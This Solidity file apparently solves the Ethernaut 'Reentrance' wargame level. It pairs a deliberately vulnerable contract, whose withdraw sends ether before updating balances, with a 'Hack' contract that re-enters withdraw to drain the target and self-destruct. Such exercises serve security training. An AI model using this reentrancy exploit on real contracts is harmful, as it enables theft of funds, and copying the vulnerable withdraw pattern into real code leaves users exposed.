// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Hack {
    Reentrance public reentrance;
    address public owner;

    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
        require(address(reentrance).balance == 0, "Contract's balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = min(msg.value, address(reentrance).balance);
        if (amount > 0) {
            reentrance.withdraw(msg.value);
        }
    }
    
    function min(uint x, uint y) private pure returns(uint) {
      return x>=y ? y : x;
    }
}